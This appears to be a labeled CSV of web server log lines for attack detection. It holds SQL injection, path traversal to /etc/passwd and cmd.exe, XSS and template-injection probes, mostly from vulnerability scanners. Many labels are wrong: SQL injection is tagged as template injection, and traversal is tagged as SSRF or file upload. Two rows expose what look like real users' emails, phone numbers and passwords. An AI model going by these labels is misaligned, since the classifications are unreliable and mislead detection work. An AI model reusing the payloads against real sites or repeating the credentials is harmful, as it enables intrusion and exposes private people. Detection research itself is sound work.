source,text
"5.101.40.234 - - [23/Jan/2019:06:54:13 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27OXDT%27%3D%27OXDT&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:58:20 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20cWZn HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:51:12 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../etc/passwd HTTP/1.1"" 404 3650 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:41:08 +0330] ""GET /././././././../../../../../winnt/win.ini HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:22:43 +0330] ""GET /scripts/parse_xml.cgi?action=login&filename=frameset.html|id\x00| HTTP/1.1"" 404 299 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"5.101.40.234 - - [23/Jan/2019:06:55:07 +0330] ""GET /image/{{basketItem.id}}?type=productModel%25%27%20ORDER%20BY%201--%20ARnG&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"91.243.166.217 - - [25/Jan/2019:19:33:50 +0330] ""GET /customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=Mobin&lastName=Mollayi&username=mobinmollanimehkar81%40gmail.com&mobile=09369549431&password=09330216605&password2=09330216605&newsLettersSwitch=on HTTP/1.1"" 302 0 ""https://www.zanbil.ir/customer/register"" ""Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36"" ""-""",Cross-Site Request Forgery
"10.128.0.205 - - [24/Mar/2018:22:45:34 +0330] ""GET /././././././../../../../../etc/passwd HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:15:48:48 +0330] ""GET /cgi-bin/index.php?act=sm_window&page=event&day=-1 UNION SELECT 1,1331909396,156031436 -- HTTP/1.1"" 404 294 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:56:02 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%20UNION%20ALL%20SELECT%20NULL%23&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:58:29 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20VUAo HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:51:20 +0330] ""GET /logon?onok=""><script>alert('axon_logon_xss.nasl')</script> HTTP/-"" - 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"5.101.40.234 - - [23/Jan/2019:06:57:45 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27jLct%27%3D%27jLct HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:41:44 +0330] ""POST http://127.0.0.1/iControl/iControlPortal.cgi HTTP/1.1"" 404 571 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.238 - - [24/Mar/2018:21:51:13 +0330] ""GET /login?user=**<script>JavaScript:alert('cpanel_login_user_xss.nasl');</script> HTTP/1.1"" 404 280 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"192.168.202.110 - - [16/Mar/2012:14:22:13 +0330] ""GET /index.php?page=documents&doc=-99' UNION SELECT null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null-- HTTP/1.1"" 404 287 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:42:04 +0330] ""GET /..../..../..../..../..../..../..../..../..../winnt/win.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:14:23:24 +0330] ""GET /phpmyadmin/forum.php?id_article=1&id_forum=-1/**/UNION/**/SELECT 1867312047-- HTTP/1.1"" 404 298 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:14:21:31 +0330] ""GET /cgi-bin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 454860451-- HTTP/1.1"" 404 296 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:42:04 +0330] ""GET /././././././../../../../../windows/win.ini HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:19:38:50 +0330] ""GET /cgi-bin/photo.php?albumid=-429' UNION SELECT 1,concat(0x73,0x69,0x74,0x65,0x78,0x5f,0x61,0x6c,0x62,0x75,0x6d,0x69,0x64,0x5f,0x73,0x71,0x6c,0x69,0x2e,0x6e,0x61,0x73,0x6c),3,4,5,6,7,8 -- ' HTTP/1.1"" 404 295 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.238 - - [24/Mar/2018:21:51:14 +0330] ""GET /../../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 400 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:22:46:26 +0330] ""GET /<script>foo</script> HTTP/1.1"" 403 241 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:21:42:05 +0330] ""GET /console/faces/com_sun_web_ui/help/masthead.jsp?windowTitle=</title><script>alert('sun_java_web_console_helpwindow_xss.nasl')</script> HTTP/1.1"" 404 1056 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"5.101.40.234 - - [23/Jan/2019:06:59:35 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:14:22:29 +0330] ""GET /cgi-bin/index.php?module=Topics&func=view&topicid=-1 UNION SELECT null,null,'mdpro_topicid_sql_injection.nasl-1331904216',null,null,null,null -- HTTP/1.1"" 404 295 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:41:44 +0330] ""GET /_mem_bin/..\xc0%qf..\xc0%qf..\xc0%qf..\xc0%qf..\xc0%qf../winnt/system32/cmd.exe?/c+dir+c:\\+/OG HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:15:45:08 +0330] ""GET /cgi-bin/parse_xml.cgi?action=login&filename=frameset.html|id\x00| HTTP/1.1"" 404 238 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"5.101.40.234 - - [23/Jan/2019:06:59:48 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:41:44 +0330] ""GET /pbserver/..\xc1%pc..\xc1%pc..\xc1%pc..\xc1%pc..\xc1%pc../winnt/system32/cmd.exe?/c+dir+c:\\+/OG HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.241.111.81 - - [24/Mar/2018:00:54:23 +0330] ""GET //../../../../../../../../../winnt/win.ini HTTP/1.1"" 404 1054 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.138 - - [17/Mar/2012:19:22:04 +0330] ""GET /index.php?page=documents&doc=-99' UNION SELECT null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null-- HTTP/1.1"" 404 287 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:42:04 +0330] ""GET /..../..../..../..../..../..../..../..../..../windows/win.ini HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:56:04 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%23&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:55:15 +0330] ""GET /image/{{basketItem.id}}?type=productModel%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20UvUv&wh=50x50 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"5.101.40.234 - - [23/Jan/2019:06:57:36 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2867%29%7C%7CCHR%2883%29%7C%7CCHR%28101%29%7C%7CCHR%2881%29%2C5%29%20FROM%20DUAL-- HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:19:19:10 +0330] ""GET /insertorder.cfm?CFID=1&CFTOKEN=1 UNION SELECT 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from Params""having 1=1 HTTP/1.1"" 404 238 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"10.128.0.205 - - [24/Mar/2018:21:41:49 +0330] ""GET /servlet/webacc?User.lang=<script>foo</script> HTTP/1.1"" 404 1056 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"5.101.40.234 - - [23/Jan/2019:06:58:03 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20KBlK HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"192.168.202.110 - - [16/Mar/2012:19:37:31 +0330] ""GET /phpmyadmin/forum.php3?id_article=1&id_forum=-1/**/UNION/**/SELECT 754539307-- HTTP/1.1"" 404 299 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:14:25:15 +0330] ""GET /manager/demos/demo.browse.php?filename=/etc/passwd HTTP/1.1"" 404 1552 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"10.128.0.205 - - [24/Mar/2018:21:41:14 +0330] ""GET /../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 404 233 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:18:32:33 +0330] ""GET /cgi-bin/forums.asp?keywords=portalapp_sortby_sql_injection.nasl&do_search=1&sortby=users.user_name UNION SELECT 1,2,3,4,5,1331919222,20650,8,9,10,3,48125,13,14,15 FROM Users HTTP/1.1"" 404 1635 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"192.168.202.110 - - [16/Mar/2012:18:32:30 +0330] ""GET /index.php?x=browse&category='UNION SELECT '1','2','pixelpost_category_sql_injection.nasl','1331919219','5'-- HTTP/1.1"" 404 1635 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Sql Injection
"5.101.40.234 - - [23/Jan/2019:06:58:40 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20scux HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.172.152.13 - - [24/Mar/2018:19:26:46 +0330] ""GET /query.idq?CiTemplate=../../../../../winnt/win.ini HTTP/1.1"" 404 302 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"roger.ecn.purdue.edu 1995-08-17T18:46:12+00:00 ""GET /mdss/srqa/../MDSS.html HTTP/1.0"" 200 1687",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:54:46 +0330] ""GET /image/{{basketItem.id}}?type=productModel%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20cpmv&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"223.166.75.32 - - [26/Jan/2019:00:39:19 +0330] ""GET http://www.boxun.com/ HTTP/1.1"" 301 178 ""-"" ""python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-693.11.1.el7.x86_64"" ""-""",Server-Side Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:40:16 +0330] ""GET /DomainFiles/*//../../../../../../etc/passwd HTTP/1.1"" 400 226 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:44:54 +0330] ""GET http://rfi.nessus.org/check_proxy.html HTTP/1.1"" 404 988 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"91.103.66.203 - - [23/Jan/2019:09:44:55 +0330] ""GET http://musicpleeer.com/ HTTP/1.1"" 400 666 ""-"" ""Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"" ""-""",Server-Side Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:41:45 +0330] ""GET /..\xc1\x1c..\xc1\x1c..\xc1\x1c..\xc1\x1c..\xc1\x1c../winnt/system32/cmd.exe?/c+dir+c:\\+/OG HTTP/1.1"" 400 324 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:22:57:47 +0330] ""GET /examples/jsp/source.jsp?../../../../system/autoexec.ncf HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:59:33 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%23 HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:44:48 +0330] ""GET /..../..../..../..../..../..../..../..../..../..../..../..../etc/passwd HTTP/1.1"" 403 279 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:58:49 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%29%20ORDER%20BY%209794%23 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:44:54 +0330] ""GET /././././././../../../../../etc/passwd HTTP/1.1"" 400 303 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"5.101.40.234 - - [23/Jan/2019:06:58:27 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20mBwJ HTTP/1.1"" 301 178 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:41:16 +0330] ""GET /./../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 233 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:22:45:14 +0330] ""GET ../../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 400 303 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.238 - - [24/Mar/2018:21:51:18 +0330] ""GET ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../ HTTP/1.1"" 400 173 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:42:05 +0330] ""GET /console/faces/com_sun_web_ui/help/helpwindow.jsp?windowTitle=</title><script>alert('sun_java_web_console_helpwindow_xss.nasl')</script> HTTP/1.1"" 404 1056 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"5.101.40.234 - - [23/Jan/2019:06:58:36 +0330] ""GET /image/{{basketItem.id}}?type=productModel&wh=50x50%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20WOQi HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [23/Mar/2018:19:01:23 +0330] ""GET /admin HTTP/1.1"" 200 7970 ""-"" ""nxdj8{{792*750}}ns6ds"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:40:21 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 303 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [23/Mar/2018:19:01:23 +0330] ""GET /favicon.ico HTTP/1.1"" 404 233 ""-"" ""dfp0o{{820*908}}mjr4q"" ""-""",Server-Side Template Injection
"10.128.0.205 - - [24/Mar/2018:21:44:48 +0330] ""GET /scripts/fake.cgi?arg=/dir/../../../../../../../../../../../winnt/win.ini HTTP/1.1"" 404 214 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"192.168.202.110 - - [16/Mar/2012:15:44:16 +0330] ""GET /en-US/account/bemarket/shop/index.php?pageurl=viewpage&filename=../../../../../../../../../../../../../../etc/passwd HTTP/1.1"" 404 314 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",file upload
"10.128.0.205 - - [24/Mar/2018:21:52:46 +0330] ""GET /logon?onok=""><script>alert('axon_logon_xss.nasl')</script> HTTP/1.1"" 400 661 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
"10.128.0.205 - - [24/Mar/2018:22:45:39 +0330] ""GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.238 - - [24/Mar/2018:21:51:16 +0330] ""GET /\x80../\x80../\x80../\x80../\x80../\x80../winnt/win.ini HTTP/1.1"" 403 246 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [25/Mar/2018:00:25:51 +0330] ""GET /../../../../../../../../../../../../etc/passwd HTTP/1.1"" 400 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:44:40 +0330] ""GET ../../../../../../../../../../../../windows/win.ini HTTP/1.1"" 400 0 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Server-Side Request Forgery
"10.128.0.205 - - [24/Mar/2018:21:49:27 +0330] ""GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../windows/win.ini HTTP/1.1"" 503 326 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"83.121.158.37 - - [25/Jan/2019:23:58:01 +0330] ""GET /settings/logo HTTP/1.1"" 200 4120 ""https://www.zanbil.ir/customer/saveBasicInfo?id=&version=&csrf_token=7e3ad709a3cfdc4dd17dedb3ea0d4c2b67f69f11ada0efbb182426b91f6b798a&firstName=Mohamad&lastName=Mohamadi&username=mohamadi23.mehregan%40gmail.com&mobile=09126082118&password=09126082118mrm&password2=0912608211&newsLettersSwitch=on"" ""Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"" ""-""",Cross-Site Request Forgery
"5.101.40.234 - - [23/Jan/2019:06:54:47 +0330] ""GET /image/{{basketItem.id}}?type=productModel%27%29%20UNION%20ALL%20SELECT%20NULL--%20krmp&wh=50x50 HTTP/1.1"" 200 5 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24"" ""-""",Server-Side Template Injection
"10.128.0.238 - - [24/Mar/2018:21:55:13 +0330] ""GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1"" 403 312 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:44:43 +0330] ""GET /note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../winnt/win.ini HTTP/1.1"" 404 290 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Local File Inclusion
"10.128.0.205 - - [24/Mar/2018:21:52:53 +0330] ""GET /popuplargeimage.asp?strImageTag=<script>foo</script> HTTP/1.1"" 404 1245 ""-"" ""Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"" ""-""",Cross-Site Scripting
